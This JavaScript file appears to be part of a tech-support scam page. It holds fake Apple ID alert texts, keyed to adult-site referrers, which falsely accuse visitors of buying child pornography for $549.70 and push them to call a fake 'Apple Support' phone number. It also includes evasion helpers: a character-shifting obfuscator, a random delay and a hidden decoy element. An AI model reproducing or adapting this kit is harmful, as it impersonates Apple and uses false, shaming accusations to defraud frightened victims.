(function() {
    'use strict';
    
    var protection = {
        randomDelay: function() {
            return Math.floor(Math.random() * 100) + 50;
        },
        
        obfuscate: function(str) {
            return str.split('').map(function(c) {
                return String.fromCharCode(c.charCodeAt(0) + 1);
            }).join('');
        },
        
        createDecoy: function() {
            var decoy = document.createElement('div');
            decoy.style.display = 'none';
            decoy.innerHTML = '<!-- legitimate content -->';
            document.body.appendChild(decoy);
        }
    };

    var browserCompat = {
        isIE: function() {
            return document.documentMode || /MSIE/.test(navigator.userAgent);
        },
        
        isEdge: function() {
            return 'msLaunchUri' in navigator && !this.isIE();
        },
        
        isChrome: function() {
            return window.chrome && window.chrome.webstore;
        },
        
        isFirefox: function() {
            return typeof InstallTrigger !== 'undefined';
        },
        
        isSafari: function() {
            return /constructor/.test(window.HTMLElement) || (function(p) { 
                return p.toString() === "[object SafariRemoteNotification]"; 
            })(!window['safari'] || safari.pushNotification);
        },
        
        addEventListenerCompat: function(element, event, handler) {
            if (element.addEventListener) {
                element.addEventListener(event, handler, false);
            } else if (element.attachEvent) {
                element.attachEvent('on' + event, handler);
            } else {
                element['on' + event] = handler;
            }
        }
    };

    window.defaultNumber = '+1-877-470-6253';
    window.defaultText = 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-877-470-6253 to Freeze it!';
    
    window.text = {
        'xhamster.com': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'perfectgirls.net': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'gotporn.com': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'anysex.com': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'sex.com': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 unlock it!',
        'bravotube.net': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'mylust.com': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'manporn.xxx': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'anybunny.com': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'txxx.com': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!',
        'findbestsolution.xyz': 'Your |%model%| Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-877-470-6253 to unlock it!'
    };

    if (document.readyState === 'loading') {
        browserCompat.addEventListenerCompat(document, 'DOMContentLoaded', function() {
            protection.createDecoy();
        });
    } else {
        protection.createDecoy();
    }

    window.protection = protection;
    window.browserCompat = browserCompat;

})();